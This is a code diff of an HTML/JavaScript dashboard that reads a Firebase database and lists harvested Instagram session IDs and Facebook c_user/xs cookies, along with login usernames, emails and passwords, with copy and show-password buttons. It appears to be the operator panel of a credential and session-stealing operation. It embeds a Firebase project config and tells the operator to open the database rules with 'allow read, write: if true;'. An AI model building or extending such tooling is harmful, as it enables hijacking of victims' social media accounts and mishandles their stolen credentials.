@@ -1,505 +1,564 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Sessions Data</title>
-  <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sessions Data</title>
+    <style>
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
 
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-      background-color: #fafafa;
-      color: #111827;
-      padding: 24px;
-      line-height: 1.5;
-    }
+      body {
+        font-family:
+          -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica,
+          Arial, sans-serif;
+        background-color: #fafafa;
+        color: #111827;
+        padding: 24px;
+        line-height: 1.5;
+      }
 
-    .container {
-      max-width: 1200px;
-      margin: 0 auto;
-    }
+      .container {
+        max-width: 1200px;
+        margin: 0 auto;
+      }
 
-    /* Top bar */
-    .top-bar {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding-bottom: 16px;
-      border-bottom: 1px solid #e5e7eb;
-      margin-bottom: 16px;
-      flex-wrap: wrap;
-      gap: 8px;
-    }
+      /* Top bar */
+      .top-bar {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding-bottom: 16px;
+        border-bottom: 1px solid #e5e7eb;
+        margin-bottom: 16px;
+        flex-wrap: wrap;
+        gap: 8px;
+      }
 
-    .title {
-      font-size: 18px;
-      font-weight: 600;
-      color: #111827;
-    }
+      .title {
+        font-size: 18px;
+        font-weight: 600;
+        color: #111827;
+      }
 
-    .status-wrap {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
+      .status-wrap {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+      }
 
-    .status {
-      font-size: 13px;
-      color: #6b7280;
-    }
+      .status {
+        font-size: 13px;
+        color: #6b7280;
+      }
 
-    .status.connected {
-      color: #059669;
-      font-weight: 600;
-    }
+      .status.connected {
+        color: #059669;
+        font-weight: 600;
+      }
 
-    .status.error {
-      color: #dc2626;
-      font-weight: 600;
-    }
+      .status.error {
+        color: #dc2626;
+        font-weight: 600;
+      }
 
-    /* Notice / Alert Box */
-    .alert-box {
-      background: #fef2f2;
-      border: 1px solid #fecaca;
-      color: #991b1b;
-      padding: 12px 16px;
-      border-radius: 6px;
-      font-size: 13px;
-      margin-bottom: 16px;
-      display: none;
-      line-height: 1.6;
-    }
+      /* Notice / Alert Box */
+      .alert-box {
+        background: #fef2f2;
+        border: 1px solid #fecaca;
+        color: #991b1b;
+        padding: 12px 16px;
+        border-radius: 6px;
+        font-size: 13px;
+        margin-bottom: 16px;
+        display: none;
+        line-height: 1.6;
+      }
 
-    .alert-box strong {
-      display: block;
-      margin-bottom: 4px;
-    }
+      .alert-box strong {
+        display: block;
+        margin-bottom: 4px;
+      }
 
-    .alert-box code {
-      background: rgba(0, 0, 0, 0.05);
-      padding: 2px 6px;
-      border-radius: 4px;
-      font-family: monospace;
-    }
+      .alert-box code {
+        background: rgba(0, 0, 0, 0.05);
+        padding: 2px 6px;
+        border-radius: 4px;
+        font-family: monospace;
+      }
 
-    /* Controls */
-    .controls {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      gap: 12px;
-      margin-bottom: 16px;
-      flex-wrap: wrap;
-    }
+      /* Controls */
+      .controls {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        gap: 12px;
+        margin-bottom: 16px;
+        flex-wrap: wrap;
+      }
 
-    .tabs {
-      display: flex;
-      gap: 8px;
-    }
+      .tabs {
+        display: flex;
+        gap: 8px;
+      }
 
-    .tab-btn {
-      background: #ffffff;
-      border: 1px solid #d1d5db;
-      padding: 6px 14px;
-      font-size: 13px;
-      font-weight: 500;
-      border-radius: 4px;
-      cursor: pointer;
-      color: #374151;
-    }
+      .tab-btn {
+        background: #ffffff;
+        border: 1px solid #d1d5db;
+        padding: 6px 14px;
+        font-size: 13px;
+        font-weight: 500;
+        border-radius: 4px;
+        cursor: pointer;
+        color: #374151;
+      }
 
-    .tab-btn:hover {
-      background: #f3f4f6;
-    }
+      .tab-btn:hover {
+        background: #f3f4f6;
+      }
 
-    .tab-btn.active {
-      background: #111827;
-      color: #ffffff;
-      border-color: #111827;
-    }
+      .tab-btn.active {
+        background: #111827;
+        color: #ffffff;
+        border-color: #111827;
+      }
 
-    .search-box {
-      border: 1px solid #d1d5db;
-      background: #ffffff;
-      padding: 6px 12px;
-      border-radius: 4px;
-      font-size: 13px;
-      width: 260px;
-      outline: none;
-    }
+      .search-box {
+        border: 1px solid #d1d5db;
+        background: #ffffff;
+        padding: 6px 12px;
+        border-radius: 4px;
+        font-size: 13px;
+        width: 260px;
+        outline: none;
+      }
 
-    .search-box:focus {
-      border-color: #111827;
-    }
+      .search-box:focus {
+        border-color: #111827;
+      }
 
-    /* Table & Cards */
-    .data-table {
-      width: 100%;
-      border-collapse: collapse;
-      background: #ffffff;
-      border: 1px solid #e5e7eb;
-      border-radius: 6px;
-      overflow: hidden;
-      font-size: 13px;
-    }
+      /* Table & Cards */
+      .data-table {
+        width: 100%;
+        border-collapse: collapse;
+        background: #ffffff;
+        border: 1px solid #e5e7eb;
+        border-radius: 6px;
+        overflow: hidden;
+        font-size: 13px;
+      }
 
-    .data-table th {
-      background: #f9fafb;
-      padding: 10px 14px;
-      text-align: left;
-      font-weight: 600;
-      color: #4b5563;
-      border-bottom: 1px solid #e5e7eb;
-    }
+      .data-table th {
+        background: #f9fafb;
+        padding: 10px 14px;
+        text-align: left;
+        font-weight: 600;
+        color: #4b5563;
+        border-bottom: 1px solid #e5e7eb;
+      }
 
-    .data-table td {
-      padding: 12px 14px;
-      border-bottom: 1px solid #e5e7eb;
-      vertical-align: top;
-    }
+      .data-table td {
+        padding: 12px 14px;
+        border-bottom: 1px solid #e5e7eb;
+        vertical-align: top;
+      }
 
-    .data-table tr:last-child td {
-      border-bottom: none;
-    }
+      .data-table tr:last-child td {
+        border-bottom: none;
+      }
 
-    .data-table tr:hover {
-      background: #f9fafb;
-    }
+      .data-table tr:hover {
+        background: #f9fafb;
+      }
 
-    .mono {
-      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
-      font-size: 12px;
-      color: #111827;
-      background: #f3f4f6;
-      padding: 2px 6px;
-      border-radius: 3px;
-      word-break: break-all;
-    }
+      .mono {
+        font-family:
+          ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+        font-size: 12px;
+        color: #111827;
+        background: #f3f4f6;
+        padding: 2px 6px;
+        border-radius: 3px;
+        word-break: break-all;
+      }
 
-    .token-cell {
-      max-width: 380px;
-      word-break: break-all;
-    }
+      .token-cell {
+        max-width: 380px;
+        word-break: break-all;
+      }
 
-    .btn-action {
-      background: #ffffff;
-      border: 1px solid #d1d5db;
-      padding: 3px 8px;
-      font-size: 11px;
-      border-radius: 3px;
-      cursor: pointer;
-      color: #374151;
-      margin-left: 6px;
-      vertical-align: middle;
-    }
+      .btn-action {
+        background: #ffffff;
+        border: 1px solid #d1d5db;
+        padding: 3px 8px;
+        font-size: 11px;
+        border-radius: 3px;
+        cursor: pointer;
+        color: #374151;
+        margin-left: 6px;
+        vertical-align: middle;
+      }
 
-    .btn-action:hover {
-      background: #f3f4f6;
-      border-color: #9ca3af;
-    }
+      .btn-action:hover {
+        background: #f3f4f6;
+        border-color: #9ca3af;
+      }
 
-    .time-text {
-      color: #6b7280;
-      font-size: 12px;
-      white-space: nowrap;
-    }
+      .time-text {
+        color: #6b7280;
+        font-size: 12px;
+        white-space: nowrap;
+      }
 
-    .empty-state {
-      text-align: center;
-      padding: 48px 16px;
-      color: #6b7280;
-      background: #ffffff;
-      border: 1px solid #e5e7eb;
-      border-radius: 6px;
-      font-size: 14px;
-    }
+      .empty-state {
+        text-align: center;
+        padding: 48px 16px;
+        color: #6b7280;
+        background: #ffffff;
+        border: 1px solid #e5e7eb;
+        border-radius: 6px;
+        font-size: 14px;
+      }
 
-    /* Notification */
-    .toast {
-      position: fixed;
-      bottom: 20px;
-      right: 20px;
-      background: #111827;
-      color: #ffffff;
-      padding: 8px 14px;
-      font-size: 12px;
-      border-radius: 4px;
-      opacity: 0;
-      transition: opacity 0.2s ease;
-      pointer-events: none;
-    }
+      /* Notification */
+      .toast {
+        position: fixed;
+        bottom: 20px;
+        right: 20px;
+        background: #111827;
+        color: #ffffff;
+        padding: 8px 14px;
+        font-size: 12px;
+        border-radius: 4px;
+        opacity: 0;
+        transition: opacity 0.2s ease;
+        pointer-events: none;
+      }
 
-    .toast.show {
-      opacity: 1;
-    }
-  </style>
-</head>
-<body>
-  <div class="container">
-    <div class="top-bar">
-      <div class="title">Live Database Records</div>
-      <div class="status-wrap">
-        <span id="status" class="status">Connecting to Firebase...</span>
-        <button id="btnRetry" class="btn-action" style="display:none;" onclick="startListening()">Retry</button>
+      .toast.show {
+        opacity: 1;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="top-bar">
+        <div class="title">Live Database Records</div>
+        <div class="status-wrap">
+          <span id="status" class="status">Connecting to Firebase...</span>
+          <button
+            id="btnRetry"
+            class="btn-action"
+            style="display: none"
+            onclick="startListening()"
+          >
+            Retry
+          </button>
+        </div>
+      </div>
+
+      <!-- Alert Box for troubleshooting if needed -->
+      <div id="alertBox" class="alert-box"></div>
+
+      <div class="controls">
+        <div class="tabs">
+          <button
+            id="tabIg"
+            class="tab-btn active"
+            onclick="switchTab('instagram')"
+          >
+            Instagram (<span id="countIg">0</span>)
+          </button>
+          <button id="tabFb" class="tab-btn" onclick="switchTab('facebook')">
+            Facebook (<span id="countFb">0</span>)
+          </button>
+        </div>
+
+        <input
+          type="text"
+          id="search"
+          class="search-box"
+          placeholder="Filter records..."
+          oninput="handleSearch()"
+        />
+      </div>
+
+      <div id="contentArea">
+        <div class="empty-state">Connecting to Firebase Firestore...</div>
       </div>
     </div>
 
-    <!-- Alert Box for troubleshooting if needed -->
-    <div id="alertBox" class="alert-box"></div>
+    <div id="toast" class="toast">Copied</div>
 
-    <div class="controls">
-      <div class="tabs">
-        <button id="tabIg" class="tab-btn active" onclick="switchTab('instagram')">Instagram (<span id="countIg">0</span>)</button>
-        <button id="tabFb" class="tab-btn" onclick="switchTab('facebook')">Facebook (<span id="countFb">0</span>)</button>
-      </div>
+    <script type="module">
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+      import {
+        initializeFirestore,
+        collection,
+        onSnapshot,
+        getDocs,
+      } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 
-      <input
-        type="text"
-        id="search"
-        class="search-box"
-        placeholder="Filter records..."
-        oninput="handleSearch()"
-      >
-    </div>
-
-    <div id="contentArea">
-      <div class="empty-state">Connecting to Firebase Firestore...</div>
-    </div>
-  </div>
-
-  <div id="toast" class="toast">Copied</div>
-
-  <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-    import { 
-      initializeFirestore, 
-      collection, 
-      onSnapshot, 
-      getDocs 
-    } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
-
-    // Global error listener to catch any network or script errors
-    window.addEventListener('error', (e) => {
-      showError('Script error: ' + (e.message || e.error));
-    });
-    window.addEventListener('unhandledrejection', (e) => {
-      showError('Promise error: ' + (e.reason?.message || e.reason));
-    });
-
-    const firebaseConfig = {
-      apiKey: "AIzaSyAIozb7XfqF1nLfrd9Q-pVhNwpgCWruwn0",
-      authDomain: "sessionid-49465.firebaseapp.com",
-      projectId: "sessionid-49465",
-      storageBucket: "sessionid-49465.firebasestorage.app",
-      messagingSenderId: "782636329164",
-      appId: "1:782636329164:web:eb4f7c893cb6f8a3183a69",
-      measurementId: "G-87FXSPPRR3"
-    };
-
-    let app;
-    let db;
-    try {
-      app = initializeApp(firebaseConfig);
-      // experimentalAutoDetectLongPolling prevents WebChannel streaming hanging on localhost
-      db = initializeFirestore(app, {
-        experimentalAutoDetectLongPolling: true,
+      // Global error listener to catch any network or script errors
+      window.addEventListener("error", (e) => {
+        showError("Script error: " + (e.message || e.error));
       });
-    } catch (err) {
-      showError("Firebase Init Error: " + err.message);
-    }
+      window.addEventListener("unhandledrejection", (e) => {
+        showError("Promise error: " + (e.reason?.message || e.reason));
+      });
 
-    let currentTab = 'instagram';
-    let instagramList = [];
-    let facebookList = [];
-    let filterQuery = '';
-    let isConnected = false;
+      const firebaseConfig = {
+        apiKey: "AIzaSyAIozb7XfqF1nLfrd9Q-pVhNwpgCWruwn0",
+        authDomain: "sessionid-49465.firebaseapp.com",
+        projectId: "sessionid-49465",
+        storageBucket: "sessionid-49465.firebasestorage.app",
+        messagingSenderId: "782636329164",
+        appId: "1:782636329164:web:eb4f7c893cb6f8a3183a69",
+        measurementId: "G-87FXSPPRR3",
+      };
 
-    const statusEl = document.getElementById('status');
-    const alertBox = document.getElementById('alertBox');
-    const btnRetry = document.getElementById('btnRetry');
+      let app;
+      let db;
+      try {
+        app = initializeApp(firebaseConfig);
+        // experimentalAutoDetectLongPolling prevents WebChannel streaming hanging on localhost
+        db = initializeFirestore(app, {
+          experimentalAutoDetectLongPolling: true,
+        });
+      } catch (err) {
+        showError("Firebase Init Error: " + err.message);
+      }
 
-    function showError(msg) {
-      console.error(msg);
-      statusEl.textContent = 'Connection Error';
-      statusEl.className = 'status error';
-      btnRetry.style.display = 'inline-block';
-      alertBox.style.display = 'block';
+      let currentTab = "instagram";
+      let instagramList = [];
+      let facebookList = [];
+      let filterQuery = "";
+      let isConnected = false;
 
-      if (msg.includes('permission-denied') || msg.includes('PERMISSION_DENIED') || msg.includes('Missing or insufficient permissions')) {
-        alertBox.innerHTML = `
+      const statusEl = document.getElementById("status");
+      const alertBox = document.getElementById("alertBox");
+      const btnRetry = document.getElementById("btnRetry");
+
+      function showError(msg) {
+        console.error(msg);
+        statusEl.textContent = "Connection Error";
+        statusEl.className = "status error";
+        btnRetry.style.display = "inline-block";
+        alertBox.style.display = "block";
+
+        if (
+          msg.includes("permission-denied") ||
+          msg.includes("PERMISSION_DENIED") ||
+          msg.includes("Missing or insufficient permissions")
+        ) {
+          alertBox.innerHTML = `
           <strong>Firebase Permission Denied!</strong>
           Firebase Firestore Security Rules allow nahi kar rahe hain.<br>
           Fix karne ke liye: 
           1. <a href="https://console.firebase.google.com/project/sessionid-49465/firestore/rules" target="_blank" style="color:#b91c1c; font-weight:bold;">Firebase Console > Firestore Rules</a> par jayein.<br>
           2. Rules me <code>allow read, write: if true;</code> set karke <strong>Publish</strong> kar dein.
         `;
-      } else {
-        alertBox.innerHTML = `<strong>Error:</strong> ${msg}`;
+        } else {
+          alertBox.innerHTML = `<strong>Error:</strong> ${msg}`;
+        }
       }
-    }
 
-    // Timeout check: agar 6 second me connect na ho to clear diagnosis show karo
-    setTimeout(() => {
-      if (!isConnected) {
-        statusEl.textContent = 'Connection Delayed';
-        statusEl.className = 'status error';
-        btnRetry.style.display = 'inline-block';
-        alertBox.style.display = 'block';
-        alertBox.innerHTML = `
+      // Timeout check: agar 6 second me connect na ho to clear diagnosis show karo
+      setTimeout(() => {
+        if (!isConnected) {
+          statusEl.textContent = "Connection Delayed";
+          statusEl.className = "status error";
+          btnRetry.style.display = "inline-block";
+          alertBox.style.display = "block";
+          alertBox.innerHTML = `
           <strong>Firebase se connect hone me samay lag raha hai:</strong><br>
           1. Browser console (F12 > Console) me check karein koi error to nahi hai.<br>
           2. Agar Firebase Console me Security Rules locked hain, to <a href="https://console.firebase.google.com/project/sessionid-49465/firestore/rules" target="_blank" style="color:#b91c1c; font-weight:bold;">Firestore Rules</a> me <code>allow read, write: if true;</code> kar dein.<br>
           3. Connection check karne ke liye Retry button dabayein.
         `;
-      }
-    }, 6000);
+        }
+      }, 6000);
 
-    window.startListening = function() {
-      btnRetry.style.display = 'none';
-      alertBox.style.display = 'none';
-      statusEl.textContent = 'Connecting to Firebase...';
-      statusEl.className = 'status';
+      window.startListening = function () {
+        btnRetry.style.display = "none";
+        alertBox.style.display = "none";
+        statusEl.textContent = "Connecting to Firebase...";
+        statusEl.className = "status";
 
-      const igCol = collection(db, 'instagram');
-      const fbCol = collection(db, 'facebook');
+        const igCol = collection(db, "instagram");
+        const fbCol = collection(db, "facebook");
 
-      // 1. Direct fetch first for instant loading
-      getDocs(igCol).then(snap => {
-        isConnected = true;
-        statusEl.textContent = 'Connected (Live)';
-        statusEl.className = 'status connected';
-        alertBox.style.display = 'none';
+        // 1. Direct fetch first for instant loading
+        getDocs(igCol)
+          .then((snap) => {
+            isConnected = true;
+            statusEl.textContent = "Connected";
+            statusEl.className = "status connected";
+            alertBox.style.display = "none";
 
-        instagramList = [];
-        snap.forEach(doc => instagramList.push({ id: doc.id, ...doc.data() }));
-        instagramList.sort((a, b) => getTime(b.timestamp) - getTime(a.timestamp));
-        document.getElementById('countIg').textContent = instagramList.length;
-        if (currentTab === 'instagram') render();
-      }).catch(err => {
-        showError(err.message);
-      });
+            instagramList = [];
+            snap.forEach((doc) =>
+              instagramList.push({ id: doc.id, ...doc.data() }),
+            );
+            instagramList.sort(
+              (a, b) => getTime(b.timestamp) - getTime(a.timestamp),
+            );
+            document.getElementById("countIg").textContent =
+              instagramList.length;
+            if (currentTab === "instagram") render();
+          })
+          .catch((err) => {
+            showError(err.message);
+          });
 
-      getDocs(fbCol).then(snap => {
-        isConnected = true;
-        statusEl.textContent = 'Connected (Live)';
-        statusEl.className = 'status connected';
-        alertBox.style.display = 'none';
+        getDocs(fbCol)
+          .then((snap) => {
+            isConnected = true;
+            statusEl.textContent = "Connected";
+            statusEl.className = "status connected";
+            alertBox.style.display = "none";
 
-        facebookList = [];
-        snap.forEach(doc => facebookList.push({ id: doc.id, ...doc.data() }));
-        facebookList.sort((a, b) => getTime(b.timestamp) - getTime(a.timestamp));
-        document.getElementById('countFb').textContent = facebookList.length;
-        if (currentTab === 'facebook') render();
-      }).catch(err => {
-        showError(err.message);
-      });
+            facebookList = [];
+            snap.forEach((doc) =>
+              facebookList.push({ id: doc.id, ...doc.data() }),
+            );
+            facebookList.sort(
+              (a, b) => getTime(b.timestamp) - getTime(a.timestamp),
+            );
+            document.getElementById("countFb").textContent =
+              facebookList.length;
+            if (currentTab === "facebook") render();
+          })
+          .catch((err) => {
+            showError(err.message);
+          });
 
-      // 2. Attach Real-time listener for live updates
-      onSnapshot(igCol, (snap) => {
-        isConnected = true;
-        statusEl.textContent = 'Connected (Live)';
-        statusEl.className = 'status connected';
-        alertBox.style.display = 'none';
+        // 2. Attach Real-time listener for live updates
+        onSnapshot(
+          igCol,
+          (snap) => {
+            isConnected = true;
+            statusEl.textContent = "Connected";
+            statusEl.className = "status connected";
+            alertBox.style.display = "none";
 
-        instagramList = [];
-        snap.forEach(doc => instagramList.push({ id: doc.id, ...doc.data() }));
-        instagramList.sort((a, b) => getTime(b.timestamp) - getTime(a.timestamp));
-        document.getElementById('countIg').textContent = instagramList.length;
-        if (currentTab === 'instagram') render();
-      }, (err) => {
-        showError(err.message);
-      });
+            instagramList = [];
+            snap.forEach((doc) =>
+              instagramList.push({ id: doc.id, ...doc.data() }),
+            );
+            instagramList.sort(
+              (a, b) => getTime(b.timestamp) - getTime(a.timestamp),
+            );
+            document.getElementById("countIg").textContent =
+              instagramList.length;
+            if (currentTab === "instagram") render();
+          },
+          (err) => {
+            showError(err.message);
+          },
+        );
 
-      onSnapshot(fbCol, (snap) => {
-        isConnected = true;
-        statusEl.textContent = 'Connected (Live)';
-        statusEl.className = 'status connected';
-        alertBox.style.display = 'none';
+        onSnapshot(
+          fbCol,
+          (snap) => {
+            isConnected = true;
+            statusEl.textContent = "Connected";
+            statusEl.className = "status connected";
+            alertBox.style.display = "none";
 
-        facebookList = [];
-        snap.forEach(doc => facebookList.push({ id: doc.id, ...doc.data() }));
-        facebookList.sort((a, b) => getTime(b.timestamp) - getTime(a.timestamp));
-        document.getElementById('countFb').textContent = facebookList.length;
-        if (currentTab === 'facebook') render();
-      }, (err) => {
-        showError(err.message);
-      });
-    };
+            facebookList = [];
+            snap.forEach((doc) =>
+              facebookList.push({ id: doc.id, ...doc.data() }),
+            );
+            facebookList.sort(
+              (a, b) => getTime(b.timestamp) - getTime(a.timestamp),
+            );
+            document.getElementById("countFb").textContent =
+              facebookList.length;
+            if (currentTab === "facebook") render();
+          },
+          (err) => {
+            showError(err.message);
+          },
+        );
+      };
 
-    // Auto start
-    window.startListening();
+      // Auto start
+      window.startListening();
 
-    function getTime(ts) {
-      if (!ts) return 0;
-      if (ts.toDate) return ts.toDate().getTime();
-      if (typeof ts === 'string') return new Date(ts).getTime();
-      if (ts.seconds) return ts.seconds * 1000;
-      return 0;
-    }
-
-    function formatDate(ts) {
-      if (!ts) return '-';
-      const d = ts.toDate ? ts.toDate() : new Date(ts);
-      if (isNaN(d.getTime())) return '-';
-      return d.toLocaleString();
-    }
-
-    window.switchTab = function(tab) {
-      currentTab = tab;
-      document.getElementById('tabIg').className = tab === 'instagram' ? 'tab-btn active' : 'tab-btn';
-      document.getElementById('tabFb').className = tab === 'facebook' ? 'tab-btn active' : 'tab-btn';
-      render();
-    };
-
-    window.handleSearch = function() {
-      filterQuery = document.getElementById('search').value.toLowerCase().trim();
-      render();
-    };
-
-    window.copyVal = function(val) {
-      navigator.clipboard.writeText(val).then(() => {
-        const toast = document.getElementById('toast');
-        toast.classList.add('show');
-        setTimeout(() => toast.classList.remove('show'), 1500);
-      });
-    };
-
-    window.togglePwd = function(id, rawVal) {
-      const el = document.getElementById(id);
-      const btn = document.getElementById('btn-' + id);
-      if (el.dataset.hidden === 'true') {
-        el.textContent = rawVal;
-        el.dataset.hidden = 'false';
-        btn.textContent = 'Hide';
-      } else {
-        el.textContent = '••••••••';
-        el.dataset.hidden = 'true';
-        btn.textContent = 'Show';
-      }
-    };
-
-    function render() {
-      const container = document.getElementById('contentArea');
-      const list = currentTab === 'instagram' ? instagramList : facebookList;
-
-      const filtered = list.filter(item => {
-        if (!filterQuery) return true;
-        return JSON.stringify(item).toLowerCase().includes(filterQuery);
-      });
-
-      if (filtered.length === 0) {
-        container.innerHTML = `<div class="empty-state">${filterQuery ? 'No matching records found' : 'No records found in database'}</div>`;
-        return;
+      function getTime(ts) {
+        if (!ts) return 0;
+        if (ts.toDate) return ts.toDate().getTime();
+        if (typeof ts === "string") return new Date(ts).getTime();
+        if (ts.seconds) return ts.seconds * 1000;
+        return 0;
       }
 
-      if (currentTab === 'instagram') {
-        let html = `
+      function formatDate(ts) {
+        if (!ts) return "-";
+        const d = ts.toDate ? ts.toDate() : new Date(ts);
+        if (isNaN(d.getTime())) return "-";
+        return d.toLocaleString();
+      }
+
+      window.switchTab = function (tab) {
+        currentTab = tab;
+        document.getElementById("tabIg").className =
+          tab === "instagram" ? "tab-btn active" : "tab-btn";
+        document.getElementById("tabFb").className =
+          tab === "facebook" ? "tab-btn active" : "tab-btn";
+        render();
+      };
+
+      window.handleSearch = function () {
+        filterQuery = document
+          .getElementById("search")
+          .value.toLowerCase()
+          .trim();
+        render();
+      };
+
+      window.copyVal = function (val) {
+        navigator.clipboard.writeText(val).then(() => {
+          const toast = document.getElementById("toast");
+          toast.classList.add("show");
+          setTimeout(() => toast.classList.remove("show"), 1500);
+        });
+      };
+
+      window.togglePwd = function (id, rawVal) {
+        const el = document.getElementById(id);
+        const btn = document.getElementById("btn-" + id);
+        if (el.dataset.hidden === "true") {
+          el.textContent = rawVal;
+          el.dataset.hidden = "false";
+          btn.textContent = "Hide";
+        } else {
+          el.textContent = "••••••••";
+          el.dataset.hidden = "true";
+          btn.textContent = "Show";
+        }
+      };
+
+      function render() {
+        const container = document.getElementById("contentArea");
+        const list = currentTab === "instagram" ? instagramList : facebookList;
+
+        const filtered = list.filter((item) => {
+          if (!filterQuery) return true;
+          return JSON.stringify(item).toLowerCase().includes(filterQuery);
+        });
+
+        if (filtered.length === 0) {
+          container.innerHTML = `<div class="empty-state">${filterQuery ? "No matching records found" : "No records found in database"}</div>`;
+          return;
+        }
+
+        if (currentTab === "instagram") {
+          let html = `
           <table class="data-table">
             <thead>
               <tr>
@@ -513,41 +572,45 @@
             <tbody>
         `;
 
-        filtered.forEach((item, index) => {
-          const username = item.username || item.loginUsername || '-';
-          const userId = item.userId || '-';
-          const sessionId = item.sessionId || '-';
-          const hasCreds = item.loginUsername || item.loginPassword;
-          const pwdId = 'ig-pwd-' + index;
+          filtered.forEach((item, index) => {
+            const username = item.username || item.loginUsername || "-";
+            const userId = item.userId || "-";
+            const sessionId = item.sessionId || "-";
+            const hasCreds = item.loginUsername || item.loginPassword;
+            const pwdId = "ig-pwd-" + index;
 
-          html += `
+            html += `
             <tr>
               <td class="time-text">${formatDate(item.timestamp)}</td>
               <td><strong>${escapeHtml(username)}</strong></td>
               <td><span class="mono">${escapeHtml(userId)}</span></td>
               <td class="token-cell">
                 <span class="mono">${escapeHtml(sessionId)}</span>
-                ${sessionId !== '-' ? `<button class="btn-action" onclick="copyVal('${escapeQuotes(sessionId)}')">Copy</button>` : ''}
+                ${sessionId !== "-" ? `<button class="btn-action" onclick="copyVal('${escapeQuotes(sessionId)}')">Copy</button>` : ""}
               </td>
               <td>
-                ${hasCreds ? `
-                  <div>User: <span class="mono">${escapeHtml(item.loginUsername || '-')}</span></div>
+                ${
+                  hasCreds
+                    ? `
+                  <div>User: <span class="mono">${escapeHtml(item.loginUsername || "-")}</span></div>
                   <div style="margin-top:4px;">
                     Pass: <span id="${pwdId}" data-hidden="true" class="mono">••••••••</span>
-                    <button id="btn-${pwdId}" class="btn-action" onclick="togglePwd('${pwdId}', '${escapeQuotes(item.loginPassword || '')}')">Show</button>
-                    <button class="btn-action" onclick="copyVal('${escapeQuotes(item.loginPassword || '')}')">Copy</button>
+                    <button id="btn-${pwdId}" class="btn-action" onclick="togglePwd('${pwdId}', '${escapeQuotes(item.loginPassword || "")}')">Show</button>
+                    <button class="btn-action" onclick="copyVal('${escapeQuotes(item.loginPassword || "")}')">Copy</button>
                   </div>
-                ` : '<span style="color:#9ca3af;">None</span>'}
+                `
+                    : '<span style="color:#9ca3af;">None</span>'
+                }
               </td>
             </tr>
           `;
-        });
+          });
 
-        html += `</tbody></table>`;
-        container.innerHTML = html;
-      } else {
-        // Facebook
-        let html = `
+          html += `</tbody></table>`;
+          container.innerHTML = html;
+        } else {
+          // Facebook
+          let html = `
           <table class="data-table">
             <thead>
               <tr>
@@ -560,56 +623,60 @@
             <tbody>
         `;
 
-        filtered.forEach((item, index) => {
-          const cUser = item.c_user || '-';
-          const xs = item.xs || '-';
-          const hasCreds = item.loginEmail || item.loginPassword;
-          const pwdId = 'fb-pwd-' + index;
+          filtered.forEach((item, index) => {
+            const cUser = item.c_user || "-";
+            const xs = item.xs || "-";
+            const hasCreds = item.loginEmail || item.loginPassword;
+            const pwdId = "fb-pwd-" + index;
 
-          html += `
+            html += `
             <tr>
               <td class="time-text">${formatDate(item.timestamp)}</td>
               <td>
                 <span class="mono">${escapeHtml(cUser)}</span>
-                ${cUser !== '-' ? `<button class="btn-action" onclick="copyVal('${escapeQuotes(cUser)}')">Copy</button>` : ''}
+                ${cUser !== "-" ? `<button class="btn-action" onclick="copyVal('${escapeQuotes(cUser)}')">Copy</button>` : ""}
               </td>
               <td class="token-cell">
                 <span class="mono">${escapeHtml(xs)}</span>
-                ${xs !== '-' ? `<button class="btn-action" onclick="copyVal('${escapeQuotes(xs)}')">Copy</button>` : ''}
+                ${xs !== "-" ? `<button class="btn-action" onclick="copyVal('${escapeQuotes(xs)}')">Copy</button>` : ""}
               </td>
               <td>
-                ${hasCreds ? `
-                  <div>Email: <span class="mono">${escapeHtml(item.loginEmail || '-')}</span></div>
+                ${
+                  hasCreds
+                    ? `
+                  <div>Email: <span class="mono">${escapeHtml(item.loginEmail || "-")}</span></div>
                   <div style="margin-top:4px;">
                     Pass: <span id="${pwdId}" data-hidden="true" class="mono">••••••••</span>
-                    <button id="btn-${pwdId}" class="btn-action" onclick="togglePwd('${pwdId}', '${escapeQuotes(item.loginPassword || '')}')">Show</button>
-                    <button class="btn-action" onclick="copyVal('${escapeQuotes(item.loginPassword || '')}')">Copy</button>
+                    <button id="btn-${pwdId}" class="btn-action" onclick="togglePwd('${pwdId}', '${escapeQuotes(item.loginPassword || "")}')">Show</button>
+                    <button class="btn-action" onclick="copyVal('${escapeQuotes(item.loginPassword || "")}')">Copy</button>
                   </div>
-                ` : '<span style="color:#9ca3af;">None</span>'}
+                `
+                    : '<span style="color:#9ca3af;">None</span>'
+                }
               </td>
             </tr>
           `;
-        });
+          });
 
-        html += `</tbody></table>`;
-        container.innerHTML = html;
+          html += `</tbody></table>`;
+          container.innerHTML = html;
+        }
       }
-    }
 
-    function escapeHtml(str) {
-      if (!str) return '';
-      return String(str)
-        .replace(/&/g, '&amp;')
-        .replace(/</g, '&lt;')
-        .replace(/>/g, '&gt;')
-        .replace(/"/g, '&quot;')
-        .replace(/'/g, '&#39;');
-    }
+      function escapeHtml(str) {
+        if (!str) return "";
+        return String(str)
+          .replace(/&/g, "&amp;")
+          .replace(/</g, "&lt;")
+          .replace(/>/g, "&gt;")
+          .replace(/"/g, "&quot;")
+          .replace(/'/g, "&#39;");
+      }
 
-    function escapeQuotes(str) {
-      if (!str) return '';
-      return String(str).replace(/'/g, "\\'").replace(/"/g, '\\"');
-    }
-  </script>
-</body>
+      function escapeQuotes(str) {
+        if (!str) return "";
